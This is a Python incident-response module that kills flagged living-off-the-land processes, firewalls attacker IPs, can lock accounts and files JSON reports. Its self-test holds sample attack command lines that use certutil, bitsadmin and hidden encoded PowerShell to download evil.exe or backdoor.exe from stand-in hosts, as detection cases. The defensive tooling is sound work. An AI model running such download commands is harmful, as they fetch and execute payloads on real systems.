"""Living-off-the-land incident responder.

Companion module to lol_detector.  When the detector flags a process at or
above a configurable confidence threshold, this module:

    1. Harvests all network connections owned by the offending PID (and its
       children) to extract attacker IPs before anything is torn down.
    2. Kills the process tree (parent → children) to stop the attack.
    3. Optionally suspends (rather than kills) for forensic preservation.
    4. Blocks every attacker IP at the host firewall
       – Windows : Windows Firewall via ``netsh advfirewall``
       – Linux   : ``iptables`` / ``ip6tables``
    5. Optionally locks the local user account that launched the process.
    6. Writes a machine-readable JSON incident report to disk.
    7. Forwards the report to an optional webhook / SIEM endpoint.
    8. Emits structured log lines so any log-shipper can pick them up.

⚠  Privilege requirements
--------------------------
Killing arbitrary PIDs and adding firewall rules both require elevated
privileges (Administrator on Windows, root / CAP_NET_ADMIN on Linux).
The responder detects when it lacks permissions and degrades gracefully:
it will still log and report even if it cannot act.

⚠  Operational safety
----------------------
This module is designed for **blue-team / defensive** use on systems you
own or are authorised to defend.  Killing processes and blocking IPs are
disruptive actions—always test in a non-production environment first and
calibrate the confidence threshold (default HIGH) to minimise false
positives before deploying in automatic mode.

Example (standalone scan of all running processes)
---------------------------------------------------
    python lol_responder.py --scan --threshold HIGH --dry-run

Example (library usage)
-----------------------
    from lol_detector import LOLDetector, Confidence
    from lol_responder import LOLResponder, ResponderConfig

    cfg = ResponderConfig(
        min_confidence=Confidence.HIGH,
        kill_process=True,
        block_ips=True,
        lock_account=False,
        report_dir="/var/log/lol_incidents",
        webhook_url="https://my-siem.example/ingest",
        dry_run=False,
    )
    responder = LOLResponder(cfg)

    # called from a process-creation event hook:
    responder.handle_detection(name, cmdline, parent_name, pid=pid, ppid=ppid)
"""

from __future__ import annotations

import argparse
import ctypes
import hashlib
import ipaddress
import json
import logging
import os
import platform
import re
import shutil
import signal
import socket
import subprocess
import sys
import time
import urllib.request
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, FrozenSet, List, Optional, Set, Tuple

# Optional dependency – graceful degradation if missing
try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

# Sibling module
try:
    from lol_detector import LOLDetector, DetectionResult, Confidence, Finding
except ImportError:
    sys.exit(
        "[lol_responder] ERROR: lol_detector.py must be in the same directory "
        "or on PYTHONPATH.  Run: python lol_responder.py --help"
    )

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

log = logging.getLogger("lol_responder")

def _setup_logging(level: int = logging.INFO) -> None:
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter(
        "%(asctime)s  %(levelname)-8s  %(name)s  %(message)s",
        datefmt="%Y-%m-%dT%H:%M:%SZ",
    ))
    logging.Formatter.converter = time.gmtime  # UTC timestamps
    root = logging.getLogger()
    root.setLevel(level)
    if not root.handlers:
        root.addHandler(handler)


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

@dataclass
class ResponderConfig:
    """All tunable knobs for the responder in one place."""

    # Detection gate
    min_confidence: Confidence = Confidence.HIGH

    # Response actions
    kill_process:   bool = True    # terminate the offending process tree
    suspend_first:  bool = True    # SIGSTOP / suspend before kill (forensics)
    block_ips:      bool = True    # add host-firewall block rules
    lock_account:   bool = False   # disable the OS account (disruptive!)

    # Reporting
    report_dir:     str  = "lol_incidents"
    webhook_url:    str  = ""      # POST JSON report here if set
    webhook_token:  str  = ""      # Bearer token for webhook auth

    # Safety
    dry_run:        bool = False   # log everything, do nothing destructive
    safe_pids:      FrozenSet[int] = field(default_factory=frozenset)  # never kill

    # IP blocklist behaviour
    block_duration_seconds: int = 0   # 0 = permanent; >0 = timed (Linux only)
    ipv6_block: bool = True


# ---------------------------------------------------------------------------
# Platform helpers
# ---------------------------------------------------------------------------

_PLATFORM = platform.system()   # "Windows" | "Linux" | "Darwin"

def _is_elevated() -> bool:
    """Return True if the process has admin / root privileges."""
    try:
        if _PLATFORM == "Windows":
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


def _resolve_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


def _is_private(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


# ---------------------------------------------------------------------------
# Network connection harvester
# ---------------------------------------------------------------------------

_LOOPBACK_RE = re.compile(r"^(127\.|::1$|0\.0\.0\.0$|::$)")

@dataclass
class ConnectionInfo:
    local_addr:  str
    remote_addr: str
    remote_port: int
    status:      str
    pid:         int
    hostname:    str = ""
    is_private:  bool = False


def _harvest_connections(pid: int) -> List[ConnectionInfo]:
    """Return all remote connections owned by *pid* and its descendants."""
    if not _PSUTIL:
        log.warning("psutil not installed – cannot harvest network connections")
        return []

    pids_of_interest: Set[int] = {pid}
    try:
        proc = psutil.Process(pid)
        pids_of_interest.update(c.pid for c in proc.children(recursive=True))
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        pass

    seen: Set[str] = set()
    connections: List[ConnectionInfo] = []

    for p_pid in pids_of_interest:
        try:
            conns = psutil.Process(p_pid).net_connections(kind="inet")
        except (psutil.NoSuchProcess, psutil.AccessDenied, AttributeError):
            try:
                # older psutil API
                conns = psutil.Process(p_pid).connections(kind="inet")  # type: ignore[attr-defined]
            except Exception:
                continue

        for c in conns:
            if not c.raddr:
                continue
            rip = c.raddr.ip
            if _LOOPBACK_RE.match(rip):
                continue
            key = f"{rip}:{c.raddr.port}"
            if key in seen:
                continue
            seen.add(key)
            connections.append(ConnectionInfo(
                local_addr  = c.laddr.ip if c.laddr else "",
                remote_addr = rip,
                remote_port = c.raddr.port,
                status      = c.status or "",
                pid         = p_pid,
                hostname    = _resolve_hostname(rip),
                is_private  = _is_private(rip),
            ))

    return connections


# ---------------------------------------------------------------------------
# IP extraction from cmdline IOCs (fallback when psutil unavailable)
# ---------------------------------------------------------------------------

_IP_RE  = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")
_URL_RE = re.compile(r"https?://([A-Za-z0-9._-]+)(?::\d+)?", re.IGNORECASE)

def _extract_ips_from_cmdline(cmdline: str, findings: List[Finding]) -> Set[str]:
    """Pull IPs / hostnames from network IOC findings and raw cmdline."""
    ips: Set[str] = set()

    for f in findings:
        if "network-ioc" in f.reason and f.detail:
            # detail looks like: ioc='http://1.2.3.4/payload'
            for m in _IP_RE.finditer(f.detail):
                ips.add(m.group(1))
            for m in _URL_RE.finditer(f.detail):
                host = m.group(1)
                # try to resolve hostname → IP
                try:
                    resolved = socket.gethostbyname(host)
                    if not _LOOPBACK_RE.match(resolved):
                        ips.add(resolved)
                except Exception:
                    pass

    # also scan raw cmdline directly
    for m in _IP_RE.finditer(cmdline):
        candidate = m.group(1)
        if not _LOOPBACK_RE.match(candidate):
            ips.add(candidate)

    return ips


# ---------------------------------------------------------------------------
# Process termination
# ---------------------------------------------------------------------------

def _get_process_tree(pid: int) -> List[int]:
    """Return [pid] + all descendant PIDs, children first."""
    if not _PSUTIL:
        return [pid]
    try:
        proc     = psutil.Process(pid)
        children = proc.children(recursive=True)
        return [c.pid for c in children] + [pid]
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return [pid]


def _suspend_process_tree(pids: List[int], dry_run: bool) -> None:
    for pid in pids:
        if dry_run:
            log.info("[DRY-RUN] Would suspend PID %d", pid)
            continue
        try:
            if _PSUTIL:
                psutil.Process(pid).suspend()
                log.info("Suspended PID %d", pid)
            elif _PLATFORM != "Windows":
                os.kill(pid, signal.SIGSTOP)
                log.info("SIGSTOP → PID %d", pid)
        except Exception as exc:
            log.warning("Could not suspend PID %d: %s", pid, exc)


def _kill_process_tree(pids: List[int], safe_pids: FrozenSet[int], dry_run: bool) -> None:
    for pid in pids:
        if pid in safe_pids:
            log.warning("PID %d is in safe_pids – skipping kill", pid)
            continue
        if dry_run:
            log.info("[DRY-RUN] Would kill PID %d", pid)
            continue
        try:
            if _PSUTIL:
                proc = psutil.Process(pid)
                proc.kill()
                log.info("Killed PID %d (%s)", pid, proc.name())
            else:
                os.kill(pid, signal.SIGKILL)
                log.info("SIGKILL → PID %d", pid)
        except Exception as exc:
            log.warning("Could not kill PID %d: %s", pid, exc)


# ---------------------------------------------------------------------------
# Host firewall blocking
# ---------------------------------------------------------------------------

def _block_ip_windows(ip: str, dry_run: bool) -> Tuple[bool, str]:
    """Add an inbound + outbound block rule via Windows Firewall."""
    rule_name = f"LOL-Block-{ip.replace(':', '-')}"
    commands = [
        ["netsh", "advfirewall", "firewall", "add", "rule",
         f"name={rule_name}-IN",
         "dir=in", "action=block",
         f"remoteip={ip}", "enable=yes", "profile=any"],
        ["netsh", "advfirewall", "firewall", "add", "rule",
         f"name={rule_name}-OUT",
         "dir=out", "action=block",
         f"remoteip={ip}", "enable=yes", "profile=any"],
    ]
    for cmd in commands:
        if dry_run:
            log.info("[DRY-RUN] Would run: %s", " ".join(cmd))
        else:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    return False, result.stderr.strip()
            except Exception as exc:
                return False, str(exc)
    return True, rule_name


def _block_ip_linux(ip: str, dry_run: bool, block_duration: int = 0, ipv6: bool = True) -> Tuple[bool, str]:
    """Block IP with iptables (and ip6tables for IPv6 addresses)."""
    is_v6 = ":" in ip
    tool  = "ip6tables" if is_v6 else "iptables"

    if is_v6 and not ipv6:
        return False, "IPv6 blocking disabled in config"

    if not shutil.which(tool):
        return False, f"{tool} not found on PATH"

    comment = f"lol-block-{int(time.time())}"
    commands: List[List[str]] = [
        [tool, "-I", "INPUT",   "-s", ip, "-m", "comment",
         "--comment", comment, "-j", "DROP"],
        [tool, "-I", "OUTPUT",  "-d", ip, "-m", "comment",
         "--comment", comment, "-j", "DROP"],
        [tool, "-I", "FORWARD", "-s", ip, "-m", "comment",
         "--comment", comment, "-j", "DROP"],
    ]

    for cmd in commands:
        if dry_run:
            log.info("[DRY-RUN] Would run: %s", " ".join(cmd))
        else:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    return False, result.stderr.strip()
            except Exception as exc:
                return False, str(exc)

    # timed unblock via `at` or background thread
    if block_duration > 0 and not dry_run and shutil.which("at"):
        unblock_cmds = "\n".join(
            f"{tool} -D {chain} -s {ip} -j DROP 2>/dev/null || true"
            for chain in ("INPUT", "OUTPUT", "FORWARD")
        )
        try:
            subprocess.run(
                ["at", f"now + {block_duration} seconds"],
                input=unblock_cmds, text=True, capture_output=True, timeout=5,
            )
            log.info("Scheduled unblock of %s in %ds", ip, block_duration)
        except Exception:
            pass

    return True, comment


def _block_ip_macos(ip: str, dry_run: bool) -> Tuple[bool, str]:
    """Block IP with pfctl on macOS."""
    anchor = "lol_responder"
    rule   = f"block drop quick from {ip} to any\nblock drop quick from any to {ip}\n"
    if dry_run:
        log.info("[DRY-RUN] Would add pf rule to block %s", ip)
        return True, "(dry-run)"
    try:
        # Ensure anchor exists
        subprocess.run(["pfctl", "-a", anchor, "-f", "-"],
                       input=rule, text=True, capture_output=True, timeout=10)
        subprocess.run(["pfctl", "-e"], capture_output=True, timeout=5)
        return True, anchor
    except Exception as exc:
        return False, str(exc)


def _block_ip(ip: str, cfg: ResponderConfig) -> Tuple[bool, str]:
    """Dispatch to the correct platform firewall helper."""
    log.info("Blocking IP: %s  (dry_run=%s)", ip, cfg.dry_run)
    if _PLATFORM == "Windows":
        return _block_ip_windows(ip, cfg.dry_run)
    if _PLATFORM == "Darwin":
        return _block_ip_macos(ip, cfg.dry_run)
    # Linux / other POSIX
    return _block_ip_linux(ip, cfg.dry_run, cfg.block_duration_seconds, cfg.ipv6_block)


# ---------------------------------------------------------------------------
# Account locking
# ---------------------------------------------------------------------------

def _lock_account(username: str, dry_run: bool) -> Tuple[bool, str]:
    if not username:
        return False, "no username supplied"

    if _PLATFORM == "Windows":
        cmd = ["net", "user", username, "/active:no"]
    elif _PLATFORM == "Darwin":
        cmd = ["dscl", ".", "-create", f"/Users/{username}", "AuthenticationAuthority", ";DisabledUser;"]
    else:
        cmd = ["usermod", "--lock", username]

    if dry_run:
        log.info("[DRY-RUN] Would run: %s", " ".join(cmd))
        return True, "(dry-run)"
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            log.warning("Locked account: %s", username)
            return True, "locked"
        return False, result.stderr.strip()
    except Exception as exc:
        return False, str(exc)


def _get_process_owner(pid: int) -> str:
    if not _PSUTIL:
        return ""
    try:
        return psutil.Process(pid).username() or ""
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# Incident report
# ---------------------------------------------------------------------------

@dataclass
class IncidentReport:
    incident_id:     str
    timestamp_utc:   str
    hostname:        str
    platform:        str
    detection:       dict           # DetectionResult.to_dict()
    attacker_ips:    List[str]
    connections:     List[dict]
    actions_taken:   List[dict]
    process_owner:   str
    elevated:        bool
    dry_run:         bool

    def to_dict(self) -> dict:
        return asdict(self)

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), indent=indent)


def _make_incident_id(detection: DetectionResult) -> str:
    blob = f"{detection.process_name}{detection.cmdline}{time.time()}"
    return "INC-" + hashlib.sha256(blob.encode()).hexdigest()[:12].upper()


def _save_report(report: IncidentReport, report_dir: str) -> Path:
    out_dir = Path(report_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    fname   = out_dir / f"{report.incident_id}.json"
    fname.write_text(report.to_json(), encoding="utf-8")
    log.info("Incident report saved → %s", fname)
    return fname


def _send_webhook(report: IncidentReport, url: str, token: str) -> bool:
    if not url:
        return False
    try:
        payload = report.to_json().encode("utf-8")
        req = urllib.request.Request(
            url,
            data    = payload,
            headers = {
                "Content-Type":  "application/json",
                "User-Agent":    "lol_responder/1.0",
                **({"Authorization": f"Bearer {token}"} if token else {}),
            },
            method  = "POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            ok = 200 <= resp.status < 300
            log.info("Webhook %s → HTTP %d", url, resp.status)
            return ok
    except Exception as exc:
        log.warning("Webhook delivery failed: %s", exc)
        return False


# ---------------------------------------------------------------------------
# Core responder
# ---------------------------------------------------------------------------

class LOLResponder:
    """Incident responder that acts on DetectionResult objects."""

    def __init__(self, config: Optional[ResponderConfig] = None) -> None:
        self.cfg = config or ResponderConfig()
        _setup_logging()

    # ------------------------------------------------------------------
    # Primary entry point
    # ------------------------------------------------------------------

    def handle_detection(
        self,
        name:        str,
        cmdline:     str,
        parent_name: str           = "",
        pid:         Optional[int] = None,
        ppid:        Optional[int] = None,
    ) -> Optional[IncidentReport]:
        """Score a process and respond if confidence meets the threshold.

        Returns the IncidentReport (or None if below threshold / benign).
        """
        result = LOLDetector.score_process(name, cmdline, parent_name, pid, ppid)
        return self.handle_result(result)

    def handle_result(self, result: DetectionResult) -> Optional[IncidentReport]:
        """Respond to an already-scored DetectionResult."""
        if result.confidence < self.cfg.min_confidence:
            log.debug(
                "Process '%s' scored %s – below threshold %s, ignoring",
                result.process_name, result.confidence.name,
                self.cfg.min_confidence.name,
            )
            return None

        log.warning(
            "🚨 LOL DETECTION  process='%s'  score=%d  confidence=%s  pid=%s",
            result.process_name, result.total_score,
            result.confidence.name, result.pid,
        )
        log.warning("   cmdline: %s", result.cmdline[:200])
        log.warning("   techniques: %s", ", ".join(result.techniques))

        pid    = result.pid
        report = self._respond(result, pid)

        log.warning(
            "📋 Incident %s filed  attacker_ips=%s  actions=%d",
            report.incident_id,
            report.attacker_ips or ["none found"],
            len(report.actions_taken),
        )
        return report

    # ------------------------------------------------------------------
    # Internal response orchestration
    # ------------------------------------------------------------------

    def _respond(self, result: DetectionResult, pid: Optional[int]) -> IncidentReport:
        actions: List[dict]  = []
        connections: List[ConnectionInfo] = []
        attacker_ips: Set[str] = set()

        # 1. Harvest network connections FIRST (before we kill anything)
        if pid:
            connections = _harvest_connections(pid)
            for c in connections:
                if not c.is_private:
                    attacker_ips.add(c.remote_addr)
                log.info(
                    "Connection: PID %d  %s  →  %s:%d  (%s)  hostname=%s",
                    c.pid, c.local_addr, c.remote_addr, c.remote_port,
                    c.status, c.hostname or "?",
                )

        # 2. Extract IPs from cmdline IOCs (supplement or fallback)
        cmdline_ips = _extract_ips_from_cmdline(result.cmdline, result.findings)
        for ip in cmdline_ips:
            if not _is_private(ip):
                attacker_ips.add(ip)

        if attacker_ips:
            log.warning("Attacker IPs identified: %s", sorted(attacker_ips))
        else:
            log.warning("No external IPs identified for this incident")

        # 3. Suspend process tree (forensic preservation)
        if pid and self.cfg.kill_process and self.cfg.suspend_first:
            tree = _get_process_tree(pid)
            log.info("Suspending process tree: %s", tree)
            _suspend_process_tree(tree, self.cfg.dry_run)
            actions.append({"action": "suspend", "pids": tree})

        # 4. Block attacker IPs
        if self.cfg.block_ips:
            for ip in sorted(attacker_ips):
                ok, detail = _block_ip(ip, self.cfg)
                actions.append({
                    "action":  "block_ip",
                    "ip":      ip,
                    "success": ok,
                    "detail":  detail,
                    "dry_run": self.cfg.dry_run,
                })
                if ok:
                    log.warning("🛑 Blocked IP %s  (%s)", ip, detail)
                else:
                    log.error("Failed to block IP %s: %s", ip, detail)

        # 5. Kill process tree
        if pid and self.cfg.kill_process:
            tree = _get_process_tree(pid)
            log.info("Killing process tree: %s", tree)
            _kill_process_tree(tree, self.cfg.safe_pids, self.cfg.dry_run)
            actions.append({
                "action":   "kill",
                "pids":     tree,
                "dry_run":  self.cfg.dry_run,
            })

        # 6. Lock account
        process_owner = _get_process_owner(pid) if pid else ""
        if self.cfg.lock_account and process_owner:
            ok, detail = _lock_account(process_owner, self.cfg.dry_run)
            actions.append({
                "action":   "lock_account",
                "username": process_owner,
                "success":  ok,
                "detail":   detail,
            })

        # 7. Build incident report
        incident_id = _make_incident_id(result)
        report = IncidentReport(
            incident_id   = incident_id,
            timestamp_utc = datetime.now(timezone.utc).isoformat(),
            hostname      = socket.gethostname(),
            platform      = _PLATFORM,
            detection     = result.to_dict(),
            attacker_ips  = sorted(attacker_ips),
            connections   = [asdict(c) for c in connections],
            actions_taken = actions,
            process_owner = process_owner,
            elevated      = _is_elevated(),
            dry_run       = self.cfg.dry_run,
        )

        # 8. Save report
        _save_report(report, self.cfg.report_dir)

        # 9. Webhook delivery
        if self.cfg.webhook_url:
            _send_webhook(report, self.cfg.webhook_url, self.cfg.webhook_token)

        return report

    # ------------------------------------------------------------------
    # Live process scanner
    # ------------------------------------------------------------------

    def scan_running_processes(self) -> List[IncidentReport]:
        """Scan every currently running process and respond to detections.

        Requires psutil.  Suitable for scheduled / on-demand sweeps.
        """
        if not _PSUTIL:
            log.error("psutil is required for scan_running_processes(). "
                      "Install with: pip install psutil")
            return []

        reports: List[IncidentReport] = []
        log.info("Starting full process scan …")
        scanned = 0

        for proc in psutil.process_iter(["pid", "name", "cmdline", "ppid"]):
            try:
                info    = proc.info
                name    = info.get("name") or ""
                cmdline = " ".join(info.get("cmdline") or [])
                pid     = info.get("pid")
                ppid    = info.get("ppid")

                # resolve parent name
                parent_name = ""
                if ppid:
                    try:
                        parent_name = psutil.Process(ppid).name()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

                report = self.handle_detection(name, cmdline, parent_name, pid, ppid)
                if report:
                    reports.append(report)
                scanned += 1

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        log.info("Process scan complete: %d processes examined, %d incidents", scanned, len(reports))
        return reports


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog        = "lol_responder",
        description = "LOL detector + responder.  Kills malicious processes and blocks attacker IPs.",
        formatter_class = argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--scan",       action="store_true",
                   help="Scan all running processes (requires psutil)")
    p.add_argument("--name",       default="",
                   help="Process name to evaluate (single-process mode)")
    p.add_argument("--cmdline",    default="",
                   help="Command line to evaluate (single-process mode)")
    p.add_argument("--parent",     default="",
                   help="Parent process name (optional)")
    p.add_argument("--pid",        type=int, default=None,
                   help="PID of the process (enables live connection harvest + kill)")

    p.add_argument("--threshold",
                   choices=["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"],
                   default="HIGH",
                   help="Minimum confidence to trigger a response")
    p.add_argument("--no-kill",    action="store_true",
                   help="Disable process killing")
    p.add_argument("--no-block",   action="store_true",
                   help="Disable IP blocking")
    p.add_argument("--lock-account", action="store_true",
                   help="Lock the OS account that owns the offending process")
    p.add_argument("--dry-run",    action="store_true",
                   help="Log actions but do not execute them")
    p.add_argument("--report-dir", default="lol_incidents",
                   help="Directory to write JSON incident reports")
    p.add_argument("--webhook",    default="",
                   help="SIEM webhook URL to POST incident reports to")
    p.add_argument("--webhook-token", default="",
                   help="Bearer token for webhook authentication")
    p.add_argument("--verbose",    action="store_true",
                   help="Enable DEBUG logging")
    return p


def main() -> None:
    parser = _build_parser()
    args   = parser.parse_args()

    _setup_logging(logging.DEBUG if args.verbose else logging.INFO)

    if not _PSUTIL:
        log.warning("psutil not installed – live PID features disabled. "
                    "pip install psutil to enable.")

    if not _is_elevated():
        log.warning("Not running as administrator/root – firewall and kill "
                    "actions may fail without elevated privileges.")

    cfg = ResponderConfig(
        min_confidence  = Confidence[args.threshold],
        kill_process    = not args.no_kill,
        block_ips       = not args.no_block,
        lock_account    = args.lock_account,
        report_dir      = args.report_dir,
        webhook_url     = args.webhook,
        webhook_token   = args.webhook_token,
        dry_run         = args.dry_run,
    )

    responder = LOLResponder(cfg)

    if args.scan:
        reports = responder.scan_running_processes()
        print(f"\n{len(reports)} incident(s) detected and responded to.")
        for r in reports:
            print(f"  {r.incident_id}  {r.detection['process_name']}  "
                  f"IPs={r.attacker_ips}")
        return

    if not args.name:
        parser.print_help()
        print("\nERROR: supply --name (and optionally --cmdline, --pid) or --scan")
        sys.exit(1)

    report = responder.handle_detection(
        name        = args.name,
        cmdline     = args.cmdline,
        parent_name = args.parent,
        pid         = args.pid,
    )
    if report:
        print("\n" + "=" * 60)
        print(f"INCIDENT: {report.incident_id}")
        print(f"Attacker IPs: {report.attacker_ips or ['none identified']}")
        print(f"Actions taken: {len(report.actions_taken)}")
        print(f"Report saved to: {report.report_dir if hasattr(report,'report_dir') else cfg.report_dir}/")
        print("=" * 60)
    else:
        print(f"No incident: '{args.name}' scored below threshold ({args.threshold}).")


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

def _self_test() -> None:
    """Validate the responder pipeline without touching the OS."""
    print("=" * 70)
    print("LOLResponder self-test  (dry-run, no real OS actions)")
    print("=" * 70)

    cfg = ResponderConfig(
        min_confidence = Confidence.MEDIUM,
        kill_process   = True,
        block_ips      = True,
        lock_account   = False,
        report_dir     = "/tmp/lol_test_incidents",
        dry_run        = True,
    )
    responder = LOLResponder(cfg)

    cases = [
        # (name, cmdline, parent, should_trigger)
        ("certutil",
         "-urlcache -f http://10.0.0.1/evil.exe C:\\Temp\\evil.exe",
         "cmd", True),

        ("powershell.exe",
         "-NoP -NonI -W Hidden -Enc QQBsAGkAYwBlAA==",
         "winword", True),

        ("bitsadmin",
         "/transfer myJob /download /priority normal "
         "http://192.168.100.42/backdoor.exe C:\\Windows\\Temp\\svc.exe",
         "", True),

        # benign – should NOT trigger at MEDIUM threshold
        ("notepad", "C:\\docs\\report.txt", "explorer", False),
    ]

    for name, cmd, parent, expect_trigger in cases:
        report = responder.handle_detection(name, cmd, parent)
        triggered = report is not None
        status    = "PASS" if triggered == expect_trigger else "FAIL"
        print(f"[{status}] {name!r:20s}  triggered={triggered}  expected={expect_trigger}")
        if report:
            print(f"       incident_id  : {report.incident_id}")
            print(f"       attacker_ips : {report.attacker_ips}")
            print(f"       actions      : {[a['action'] for a in report.actions_taken]}")
            print(f"       techniques   : {report.detection.get('techniques', [])}")

    print("=" * 70)
    print("Self-test complete.")
    print("=" * 70)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        # no args → run self-test
        _setup_logging()
        _self_test()
    else:
        main()